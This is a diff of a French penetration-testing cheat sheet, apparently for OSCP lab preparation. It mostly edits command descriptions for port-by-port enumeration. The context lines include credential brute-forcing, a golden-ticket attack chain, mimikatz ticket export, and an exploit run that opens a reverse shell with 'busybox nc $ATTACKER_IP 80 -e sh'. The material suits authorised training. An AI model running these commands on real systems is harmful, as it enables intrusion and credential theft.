@@ -64,7 +64,7 @@ Vérifier les ports et les services de la cible autorisée.
 Vérifier les ports et les services de la cible autorisée.
 
 
-<p class="oscp-command-note">Établir ou tester une connexion avec Netcat.</p>
+<p class="oscp-command-note">Netcat/Telnet : établir la connexion TCP au service «Netcat».</p>
 
 ```bash
 nc [options] [host] [port_number]
@@ -84,10 +84,10 @@ nc -nvv -w 1 -z [host] [beginning_port]-[finished_port]
 # -w est de spécifier le délai de connexion en secondes, ainsi que -z pour spécifier le mode zéro-I/O, qui sert au scan des ports et n'envoie aucune donnée
 nc -nv -u -z -w 1 [host] [beginning_port]-[finished_port]
 
-# -u inidcates to do an UDP scan
+# -u utilise UDP plutôt que TCP.
 nc -zvu [host] [port]
 
-# Receive reverse shell in specific port
+# Recevoir un shell inversé sur un port précis
 nc -nvlp [listening_port]
 
 ```
@@ -104,7 +104,7 @@ Vérifier les ports et les services de la cible autorisée.
 **Énumération avancée**
 
 
-<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
+<p class="oscp-command-note">Nmap -A : identifier l'OS, les versions, les scripts standards et tracer la route ; enregistrer le scan.</p>
 
 ```bash
 nmap -A [IP/domain] -oN [machine_name].txt
@@ -137,7 +137,7 @@ nmap -p- -T4 -n -Pn [IP/domain] -oN [machine_name]_ports.txt
 **Seconde alternative de scan rapide**
 
 
-<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
+<p class="oscp-command-note">Nmap : scanner tous les ports TCP avec un débit élevé et enregistrer la sortie grepable.</p>
 
 ```bash
 sudo nmap --min-rate 5000 -p- -vvv -Pn -n -oG openPorts.txt [IP]
@@ -159,7 +159,7 @@ nmap -p- [IP/Domain] -oN [machine_name]_ports.txt
 **Ports les plus courants**
 
 
-<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
+<p class="oscp-command-note">Nmap : scanner un nombre défini de ports parmi les plus fréquents.</p>
 
 ```bash
 nmap [IP/Domain] --top-ports [number_of_top_ports]
@@ -179,7 +179,7 @@ Vérifier les ports et les services de la cible autorisée.
 **Scan UDP (-sU)**
 
 
-<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
+<p class="oscp-command-note">Nmap : effectuer un scan SYN des ports TCP.</p>
 
 ```bash
 sudo nmap -sU -sS [IP]
@@ -253,7 +253,7 @@ nmap -sn [IP_range]
 **20 ports les plus courants**
 
 
-<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
+<p class="oscp-command-note">Nmap : scanner les 20 ports les plus fréquents sur la cible.</p>
 
 ```bash
 nmap --top-ports=20 [IP]
@@ -277,7 +277,7 @@ Vérifier les ports et les services de la cible autorisée.
 **Détection du système d'exploitation (`-O`)**
 
 
-<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
+<p class="oscp-command-note">Nmap -O : tenter d'identifier le système d'exploitation par empreinte réseau.</p>
 
 ```bash
 nmap -O [IP]
@@ -314,7 +314,7 @@ nmap -sV [IP]
 **Bannières de services et traceroute**
 
 
-<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
+<p class="oscp-command-note">Nmap -A : regrouper détection d'OS, versions, scripts NSE et traceroute.</p>
 
 ```bash
 nmap -A [IP]
@@ -377,7 +377,7 @@ Vérifier les ports et les services de la cible autorisée.
 **Exécuter un script NSE (--script)**
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap : exécuter le script NSE choisi, après avoir lu son aide.</p>
 
 ```bash
 nmap --script [scriptName] [IP]
@@ -399,7 +399,7 @@ nmap --script-help [scriptName]
 **Exemple de script**
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (HTTP) : lancer les scripts NSE « http-headers ».</p>
 
 ```bash
 nmap --script http-headers [IP]
@@ -642,7 +642,7 @@ Vérifier les ports et les services de la cible autorisée.
 Transférer ou récupérer des fichiers dans le laboratoire.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (FTP) : lancer les scripts NSE « ftp-anon, ftp-bounce, ftp-libopie ».</p>
 
 ```bash
 nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 [IP]
@@ -687,7 +687,7 @@ find / -name Settings.*  2>/dev/null
 ```
 
 
-<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
+<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur FTP à partir d'un dictionnaire.</p>
 
 ```bash
 hydra -l [username] -P [path_to_wordlist] [IP] -t 4 ftp
@@ -718,16 +718,16 @@ wget -q --spider 'ftp://anonymous:anonymous@<IP_CIBLE>/'
 ### 22: SSH
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (SSH) : lancer les scripts NSE « ssh-hostkey ».</p>
 
 ```bash
 # Examiner le service SSH
 nmap -p 22 --script=ssh-hostkey <target_ip>
 
-# SSH Authentication Bypass Detection
+# Détecter les contournements d'authentification SSH
 nmap -p 22 --script=ssh-auth-methods <target_ip>
 
-# SSH Brute Force Attack
+# Tester les mots de passe SSH dans le périmètre autorisé
 nmap -p 22 --script=ssh-brute --script-args userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/wordlists/rockyou.txt <target_ip>
 
 # Identifier la version SSH
@@ -736,13 +736,13 @@ nmap -p 22 --script=ssh3-enum-algos <target_ip>
 # Examiner les algorithmes SSH anciens
 nmap -p 22 --script=ssh3-enum-algos,sshv1 <target_ip>
 
-# SSH Public Key Authentication
+# Authentification SSH par clé publique
 nmap -p 22 --script=ssh-publickey-acceptance --script-args ssh.user=<username>,ssh.privatekey=<path_to_private_key> <target_ip>
 
 ```
 
 
-<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
+<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur SSH à partir d'un dictionnaire.</p>
 
 ```bash
 hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target_ip> -t 4 ssh
@@ -782,7 +782,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt <private_key_file>.hash
 ```
 
 
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
+<p class="oscp-command-note">Localiser les clés SSH et les fichiers associés.</p>
 
 ```bash
 find /etc/ssh -name "*.pub"
@@ -930,7 +930,7 @@ ssh user@target_ip "whoami"
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « 22: SSH ».</p>
+<p class="oscp-command-note">SSH : exemple de traitement des sous-commandes à partir de SSH_ORIGINAL_COMMAND, notamment SCP.</p>
 
 ```bash
 #!/bin/bash
@@ -974,7 +974,7 @@ ssh -i <private_key_file> <user>@<target_ip>
 # Connexion de base
 telnet <target_ip> 23
 
-# Login with specific username
+# Se connecter avec un nom d'utilisateur précis
 telnet -l <username> <target_ip>
 
 ```
@@ -983,7 +983,7 @@ telnet -l <username> <target_ip>
 ### 25: SMTP
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (SMTP) : lancer les scripts NSE « smtp-commands, smtp-enum-users, smtp-vuln-cve2010-4344 ».</p>
 
 ```bash
 # Analyse avec les scripts Nmap (NSE)
@@ -1008,7 +1008,7 @@ VRFY test_user
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « 25: SMTP ».</p>
+<p class="oscp-command-note">Exemple de sortie pour «SMTP» : ce bloc illustre les réponses, il n'est pas à coller tel quel.</p>
 
 ```bash
 # Utilisation
@@ -1023,7 +1023,7 @@ b'550 5.1.1 <testUser>: Recipient address rejected: User unknown in local recipi
 ```
 
 
-<p class="oscp-command-note">Script Python lié à « 25: SMTP ».</p>
+<p class="oscp-command-note">Script Python : implémentation de «SMTP».</p>
 
 ```python
 import socket
@@ -1056,7 +1056,7 @@ s.close()
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « 25: SMTP ».</p>
+<p class="oscp-command-note">Windows : activer le client Telnet puis tester le dialogue SMTP sur le port 25.</p>
 
 ```powershell
 dism /online /Enable-Feature /FeatureName:TelnetClient
@@ -1072,7 +1072,7 @@ VRFY root
 ```
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (HTTP) : lancer les scripts NSE « http-shellshock ».</p>
 
 ```bash
 # Vérifier si elle est vulnérable
@@ -1124,7 +1124,7 @@ smtp-user-enum -M RCPT -U <FICHIER_UTILISATEURS>.txt -t <IP_CIBLE>
 Interroger les enregistrements DNS et identifier les services associés.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (DNS) : lancer les scripts NSE « dns-brute, dns-nsid, dns-recursion ».</p>
 
 ```bash
 nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 <target_ip>
@@ -1161,7 +1161,7 @@ dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver <dns_server_ip> <domain
 ```
 
 
-<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
+<p class="oscp-command-note">Nmap -sL : demander la résolution DNS des adresses d'une plage sans scanner les ports.</p>
 
 ```bash
 nmap -sL <target_ip_range> | grep "Nmap scan report"  # Reverse DNS lookup for a range
@@ -1212,7 +1212,7 @@ dig @<SERVEUR_DNS> <DOMAINE> AXFR
 Transférer ou récupérer des fichiers dans le laboratoire.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (TFTP) : lancer les scripts NSE « tftp-enum ».</p>
 
 ```bash
 nmap -p 69 --script tftp-enum <target_ip>
@@ -1286,7 +1286,7 @@ for i in $(cat <file_list.txt>); do tftp <target_ip> 69 -c get $i; done
 ```
 
 
-<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
+<p class="oscp-command-note">Transmettre des instructions de téléchargement ou d'envoi à TFTP.</p>
 
 ```bash
 echo -e "get <remote_file> <local_file>\nquit" | tftp <target_ip>
@@ -1300,7 +1300,7 @@ echo -e "put <local_file> <remote_file>\nquit" | tftp <target_ip>
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (KERBEROS) : lancer les scripts NSE « kerberos-enum-users ».</p>
 
 ```bash
 # Vérifiez la disponibilité du service Kerberos et obtenez des informations de base
@@ -1351,7 +1351,7 @@ hashcat -m 13100 <ticket_file> <wordlist>
 ```
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Kerberos : demander des tickets d'authentification de test.</p>
 
 ```bash
 # Demander un ticket TGT (Ticket Granting Ticket)
@@ -1386,7 +1386,7 @@ krb5-brute -d <domain> -t <target_ip> -u <username> -p <password_list>
 ```
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>
 
 ```bash
 # Renouveler un ticket Kerberos TGT
@@ -1409,7 +1409,7 @@ mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
 ```
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Kerberos : tester les noms de comptes du domaine avec Kerbrute.</p>
 
 ```bash
 # Essai de configurations de pré-authentification faibles
@@ -1451,16 +1451,16 @@ rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<doma
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
 ```bash
-# 1. Obtain KRBTGT NTLM Hash
+# 1. Obtenir le hash NTLM du compte krbtgt
 impacket-secretsdump -outputfile <dump_file> <target_domain>/<username>:<password>@<dc_ip>
 
 # 2. Generate a Golden Ticket
 ticketer -user <user> -domain <domain> -sid <domain_sid> -krbtgt <krbtgt_hash> -output <ticket_file>
 
-# 3. Use the Golden Ticket
+# 3. Utiliser le ticket Kerberos forgé dans le laboratoire.
 impacket-smbexec -target-ip <target_ip> -ticket <ticket_file> <username>
 
-# (Optional) Pass the Golden Ticket
+# Facultatif : utiliser le ticket Kerberos forgé
 impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>
 
 ```
@@ -1469,7 +1469,7 @@ impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>
 ### 110: POP3
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (POP3) : lancer les scripts NSE « pop3-capabilities ».</p>
 
 ```bash
 nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 <target_ip>
@@ -1496,10 +1496,10 @@ RETR 1
 ```
 
 
-<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
+<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur POP3 à partir d'un dictionnaire.</p>
 
 ```bash
-# Standard brute force on POP3
+# Tester les mots de passe du service POP3
 hydra -l <username> -P <password_list> -f <target_ip> pop3 -V
 
 # Force brute avec SSL/TLS sur POP3 au-dessus du port 995
@@ -1533,7 +1533,7 @@ QUIT
 ### 111: RPC
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (RPC) : lancer les scripts NSE « rpcinfo ».</p>
 
 ```bash
 nmap -sV -p 111 --script=rpcinfo <target_ip>
@@ -1562,7 +1562,7 @@ showmount -e <target_ip>
 ### 135, 593: MSRPC
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (MSRPC) : lancer les scripts NSE « msrpc-enum ».</p>
 
 ```bash
 nmap -p 135 --script msrpc-enum <target_ip>
@@ -1660,7 +1660,7 @@ queryuseraliases [builtin|domain] <sid>
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « 135, 593: MSRPC ».</p>
+<p class="oscp-command-note">RPC : examiner les groupes, utilisateurs et identifiants disponibles.</p>
 
 ```bash
 # Liste des groupes
@@ -1702,7 +1702,7 @@ querydominfo
 ```
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (SMB) : lancer les scripts NSE « smb-brute ».</p>
 
 ```bash
 # Nmap
@@ -1719,7 +1719,7 @@ impacket-lookupsid [domain.com]/[userName]:[domain.com]@987@[ip]
 ```
 
 
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
+<p class="oscp-command-note">Localiser les fichiers correspondant aux critères indiqués.</p>
 
 ```bash
 Find SID by Name
@@ -1757,14 +1757,14 @@ rpcclient -U "" -N <ip> -c "setuserinfo2 <USER> 23 <NEW_PASSWORD>"
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
+<p class="oscp-command-note">Nmap : contrôler les ports SMB 139/445 et relever les informations du système via NSE.</p>
 
 ```bash
 # Scanner les ports et services avec Nmap
 nmap -v -p 139,445 [IP]
 nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery <ip>
 
-# NetBIOS Scan
+# Analyser les services NetBIOS
 sudo nbtscan -r 192.168.50.0/24
 
 # Vue réseau Windows
@@ -1773,7 +1773,7 @@ net view \\[domainName] /all
 ```
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (SMB) : lancer les scripts NSE « smb-enum-shares ».</p>
 
 ```bash
 nmap --script smb-enum-shares.nse -p445 <ip>
@@ -1892,7 +1892,7 @@ sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<IP>/<SHARE> /tmp/
 ```
 
 
-<p class="oscp-command-note">Exécuter une commande distante via SMB.</p>
+<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>
 
 ```bash
 # PsExec
@@ -1928,7 +1928,7 @@ crackmapexec smb <IP> -u <USER> -H <NTHASH> --psexec
 ```
 
 
-<p class="oscp-command-note">Exécuter une commande distante via WMI.</p>
+<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>
 
 ```bash
 # Identifiants
@@ -1938,8 +1938,8 @@ wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
 wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 
 # Vérification avec CrackMapExec
-crackmapexec wmiexec <IP> -u <USER> -p <PASSWORD>
-crackmapexec wmiexec <IP> -u <USER> -H <NTHASH>
+crackmapexec smb <IP> -u <USER> -p <PASSWORD> --exec-method wmiexec -x 'whoami'
+crackmapexec smb <IP> -u <USER> -H <NTHASH> --exec-method wmiexec -x 'whoami'
 
 ```
 
@@ -1969,7 +1969,7 @@ nxc smb <IP_CIBLE> -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>' --shares
 ### 143, 993: IMAP
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (IMAP) : lancer les scripts NSE « imap-ntlm-info ».</p>
 
 ```bash
 nmap -p 143,993 --script imap-ntlm-info <ip>
@@ -1993,7 +1993,7 @@ searchsploit imap <version>
 ```
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Exécuter check_imap.py avec les paramètres indiqués pour «IMAP».</p>
 
 ```bash
 # Utilisation
@@ -2002,7 +2002,7 @@ python3 check_imap.py <target-ip> <port>
 ```
 
 
-<p class="oscp-command-note">Script Python lié à « 143, 993: IMAP ».</p>
+<p class="oscp-command-note">Script Python : implémentation de «IMAP».</p>
 
 ```python
 import imaplib
@@ -2043,7 +2043,7 @@ openssl s_client -connect <IP_CIBLE>:993 -servername <NOM_DNS> -brief
 ### 161 (UDP): SNMP
 
 
-<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
+<p class="oscp-command-note">Nmap (161) : lancer les scripts NSE « snmp-* ».</p>
 
 ```bash
 sudo nmap -sU --open -p 161 <target-ip-range> -oG open-snmp.txt
@@ -2089,7 +2089,7 @@ snmp-check <target-ip>
 `onesixtyone`  
 
 
-<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
+<p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>
 
 ```bash
 echo <community1> > community
@@ -2181,7 +2181,7 @@ snmpwalk -v2c -c '<COMMUNAUTE>' <IP_CIBLE> 1.3.6.1.2.1.25.4.2.1.2
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (LDAP) : lancer les scripts NSE « ldap* ».</p>
 
 ```bash
 nmap -n -sV --script "ldap* and not brute" <target_ip>
@@ -2217,10 +2217,10 @@ ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=grou
 # Recherche avec authentification
 ldapsearch -h <target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>"
 
-# Searching terms
+# Filtres de recherche.
 ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>"
 
-# Specifies the value term to return
+# Précise la valeur ou le terme à retourner.
 ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>" <additionalTerm>
 
 ```
@@ -2234,9 +2234,9 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « 389, 636, 3268 &amp; 3269: LDAP ».</p>
+<p class="oscp-command-note">Filtres LDAP à insérer dans ldapsearch : ces expressions ne s’exécutent pas dans Bash.</p>
 
-```bash
+```text
 # Termes de recherche pour trouver les mots de passe Cleartext
 # Rechercher ms-MCS-AdmPwd (mots de passe de l'administrateur local)
 (ms-MCS-AdmPwd=*)
@@ -2361,7 +2361,7 @@ ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(object
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (MS-SQL) : lancer les scripts NSE « ms-sql-info, ms-sql-empty-password, ms-sql-xp-cmdshell ».</p>
 
 ```bash
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <ip>
@@ -2384,7 +2384,7 @@ crackmapexec mssql -d <domain> -u <username> -p <password> -x "SELECT name FROM 
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « 1433: MSSQL ».</p>
+<p class="oscp-command-note">MSSQL : se connecter à l'instance SQL avec le compte autorisé.</p>
 
 ```bash
 # Connectez-vous à MSSQL en utilisant sqsh (Linux)
@@ -2468,7 +2468,7 @@ impacket-mssqlclient '<DOMAINE>/<UTILISATEUR>:<MOT_DE_PASSE>@<IP_CIBLE>' -window
 ### 2049: NFS
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (NFS) : lancer les scripts NSE « nfs-showmount, nfs-ls, nfs-statfs ».</p>
 
 ```bash
 nmap -p 2049 -sV --script "nfs-showmount,nfs-ls,nfs-statfs,nfs-secure,nfs-client,disk,nfs-*" <target_ip>
@@ -2503,7 +2503,7 @@ sudo mount -t nfs -o vers=<version>,nolock <target_ip>:<share> <mount_point>
 ### 3003: CGMS (possible)
 
 
-<p class="oscp-command-note">Établir ou tester une connexion avec Netcat.</p>
+<p class="oscp-command-note">Netcat/Telnet : établir la connexion TCP au service «CGMS (possible)».</p>
 
 ```bash
 # Connexion au service
@@ -2533,9 +2533,9 @@ nc -nlvp 443
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « 3003: CGMS (possible) ».</p>
+<p class="oscp-command-note">Commandes internes CGMS : à saisir dans son interface après connexion, pas dans PowerShell.</p>
 
-```powershell
+```text
 bins
 build
 build_os
@@ -2612,7 +2612,7 @@ version
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (MYSQL) : lancer les scripts NSE « mysql-audit, mysql-databases, mysql-dump-hashes ».</p>
 
 ```bash
 nmap -sV -p 3306 --script "mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122" <target_ip>
@@ -2620,15 +2620,15 @@ nmap -sV -p 3306 --script "mysql-audit,mysql-databases,mysql-dump-hashes,mysql-e
 ```
 
 
-<p class="oscp-command-note">Exécuter la requête SQL indiquée sur le service MySQL avec CrackMapExec (droits requis).</p>
+<p class="oscp-command-note">MySQL : lister les bases avec le client mysql natif ; -p demande le mot de passe.</p>
 
 ```bash
-crackmapexec mysql -d <database> -u <username> -p <password> -x "SHOW DATABASES;" <target_ip>
+mysql -h <target_ip> -u <username> -p -e 'SHOW DATABASES;'
 
 ```
 
 
-<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
+<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur MYSQL à partir d'un dictionnaire.</p>
 
 ```bash
 # Tester les identifiants MySQL par force brute avec Hydra
@@ -2694,7 +2694,7 @@ Successfully processed 1 files; Failed processing 0 files
 ### 3389: RDP
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (RDP) : lancer les scripts NSE « rdp-enum-encryption, rdp-vuln-ms12-020, rdp-ntlm-info ».</p>
 
 ```bash
 nmap --script "rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info,rdp-banner" -p 3389 <IP>
@@ -2702,7 +2702,7 @@ nmap --script "rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info,rdp-banner" -
 ```
 
 
-<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
+<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur RDP à partir d'un dictionnaire.</p>
 
 ```bash
 hydra -L <user_list> -P <password_list> -s 3389 rdp://<IP>
@@ -2710,7 +2710,7 @@ hydra -L <user_list> -P <password_list> -s 3389 rdp://<IP>
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « 3389: RDP ».</p>
+<p class="oscp-command-note">RDP : tester les identifiants de laboratoire avec Crowbar ou CrackMapExec.</p>
 
 ```bash
 # Utilisation de Crowbar
@@ -2722,7 +2722,7 @@ crackmapexec rdp <target_ip> -u users.txt -p rockyou.txt
 ```
 
 
-<p class="oscp-command-note">Ouvrir une session RDP.</p>
+<p class="oscp-command-note">Ouvrir un accès graphique à la cible via VNC ou RDP.</p>
 
 ```bash
 # Connectez-vous en utilisant xfreerdp avec différentes options
@@ -2759,7 +2759,7 @@ nxc rdp <IP_CIBLE> -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>'
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (POSTGRESQL) : lancer les scripts NSE « postgresql-info, postgresql-user-enum, postgresql-ssl ».</p>
 
 ```bash
 nmap -sV -p 5432,5433 --script "postgresql-info,postgresql-user-enum,postgresql-ssl" <ip>
@@ -2767,7 +2767,7 @@ nmap -sV -p 5432,5433 --script "postgresql-info,postgresql-user-enum,postgresql-
 ```
 
 
-<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
+<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur POSTGRESQL à partir d'un dictionnaire.</p>
 
 ```bash
 hydra -L users.txt -P passwords.txt -s 5432 <ip> postgresql
@@ -2775,10 +2775,10 @@ hydra -L users.txt -P passwords.txt -s 5432 <ip> postgresql
 ```
 
 
-<p class="oscp-command-note">Tester les identifiants fournis sur le service POSTGRES avec CrackMapExec.</p>
+<p class="oscp-command-note">PostgreSQL : se connecter avec psql et afficher les bases accessibles.</p>
 
 ```bash
-crackmapexec postgres -d <DB_NAME> -u <USER> -p <PASSWORD> -t <ip>
+psql -h <ip> -U <USER> -d <DB_NAME> -c '\l'
 
 ```
 
@@ -2792,10 +2792,10 @@ psql -h <ip> -p 5432 -U <USER> -W
 ```
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Exécuter 50847.py avec les paramètres indiqués pour «PostgreSQL».</p>
 
 ```bash
-# RCE is possible for versions: PostgreSQL DB 11.3 - 11.9
+# Versions mentionnées comme potentiellement affectées par une RCE : vérifier la version exacte et les correctifs.
 
 # Exécutez le script d'exploitation pour obtenir l'exécution de code à distance
 python3 50847.py -i <ip> -p 5437 -c "busybox nc $ATTACKER_IP 80 -e sh"
@@ -2803,7 +2803,7 @@ python3 50847.py -i <ip> -p 5437 -c "busybox nc $ATTACKER_IP 80 -e sh"
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « 5432, 5433: PostgreSQL ».</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «PostgreSQL».</p>
 
 ```bash
 #POC  
@@ -2874,7 +2874,7 @@ DELETE FROM test_table WHERE id = 1;
 ### 5900: VNC (Virtual Network Computing)
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (VNC) : lancer les scripts NSE « vnc-info, vnc-auth-bypass ».</p>
 
 ```bash
 nmap -p 5900 --script vnc-info,vnc-auth-bypass <ip>
@@ -2882,7 +2882,7 @@ nmap -p 5900 --script vnc-info,vnc-auth-bypass <ip>
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « 5900: VNC (Virtual Network Computing) ».</p>
+<p class="oscp-command-note">Ouvrir un accès graphique à la cible via VNC ou RDP.</p>
 
 ```bash
 # Utilisez vncviewer ou tigrevnc pour vous connecter à un serveur VNC
@@ -2894,7 +2894,7 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 ```
 
 
-<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
+<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur VNC à partir d'un dictionnaire.</p>
 
 ```bash
 hydra -L <user_list> -P <password_list> vnc://<ip>
@@ -2930,7 +2930,7 @@ vnc
 Observer les permissions et la configuration de Windows.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (WINRM) : lancer les scripts NSE « winrm-info ».</p>
 
 ```bash
 nmap -p 5985,5986 --script winrm-info <ip>
@@ -2988,7 +2988,7 @@ nxc winrm <IP_CIBLE> -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>' -d '<DOMAINE>'
 ### 6379: Redis
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (REDIS) : lancer les scripts NSE « redis-info, redis-rce ».</p>
 
 ```bash
 nmap -p 6379 --script "redis-info,redis-rce" <ip>
@@ -3045,7 +3045,7 @@ shutdown      # Shutdown the Redis server
 Vérifier les ports et les services de la cible autorisée.
 
 
